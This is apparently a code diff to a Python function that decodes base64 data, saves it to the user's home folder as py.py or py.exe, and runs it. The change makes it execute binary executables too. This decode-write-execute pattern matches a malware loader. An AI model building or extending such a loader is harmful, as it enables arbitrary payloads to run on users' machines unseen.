@@ -260,10 +260,12 @@ def decode_and_execute():
                 decoded_text = decoded_bytes.decode('utf-8')
                 print(f"Декодированный текст:\n{decoded_text}")
                 file_extension = ".py"
+                is_text = True
             except UnicodeDecodeError:
                 print("Данные содержат бинарный код")
                 decoded_text = None
                 file_extension = ".exe"
+                is_text = False
             
             user_profile = os.path.expanduser("~")
             output_filename = "py" + file_extension
@@ -277,20 +279,27 @@ def decode_and_execute():
                 print(f"Ошибка сохранения файла: {e}")
                 return
             
-            if decoded_text is not None:
-                try:
-                    print("Попытка выполнения созданного файла...")
+            # Запускаем файл независимо от типа
+            try:
+                print("Попытка выполнения созданного файла...")
+                if is_text:
+                    # Для Python файлов
                     result = subprocess.run([sys.executable, output_path], 
                                           capture_output=True, text=True, timeout=10)
                     print(f"Результат выполнения:\n{result.stdout}")
                     if result.stderr:
                         print(f"Ошибки выполнения:\n{result.stderr}")
-                except subprocess.TimeoutExpired:
-                    print("Выполнение превысило время ожидания")
-                except Exception as e:
-                    print(f"Ошибка выполнения файла: {e}")
-            else:
-                print("Бинарный файл сохранен, выполнение не требуется")
+                else:
+                    # Для бинарных файлов
+                    result = subprocess.run([output_path], 
+                                          capture_output=True, timeout=10)
+                    print("Бинарный файл выполнен")
+                    if result.stdout:
+                        print(f"Вывод:\n{result.stdout.decode('cp866', errors='ignore')}")
+            except subprocess.TimeoutExpired:
+                print("Выполнение превысило время ожидания")
+            except Exception as e:
+                print(f"Ошибка выполнения файла: {e}")
                     
         except Exception as e:
             print(f"Ошибка декодирования base64: {e}")
